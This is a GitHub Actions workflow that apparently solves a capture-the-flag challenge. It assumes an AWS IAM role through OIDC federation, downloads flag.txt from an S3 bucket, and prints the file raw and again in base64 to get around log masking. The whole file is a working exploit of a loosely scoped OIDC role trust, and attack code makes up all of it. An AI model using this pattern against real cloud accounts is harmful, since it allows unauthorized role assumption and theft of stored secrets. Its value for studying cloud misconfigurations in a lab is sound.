name: Get Flag via OIDC
on:
  workflow_dispatch:
  push:
    branches: [ main ]

permissions:
  id-token: write
  contents: read

jobs:
  fetch-flag:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
          role-session-name: GitHubActions-Flag-${{ github.run_id }}
          aws-region: ap-southeast-1

      - name: Try to download and print flag
        run: |
          echo "attempting s3 cp..."
          aws s3 cp s3://oh-i-really-do-care/flag.txt ./flag.txt || true
          echo "---- raw file ----"
          if [ -f ./flag.txt ]; then
            cat ./flag.txt || true
            echo "---- base64 (backup) ----"
            base64 ./flag.txt || true
          else
            echo "flag.txt not present after aws s3 cp (check errors above)."
          fi
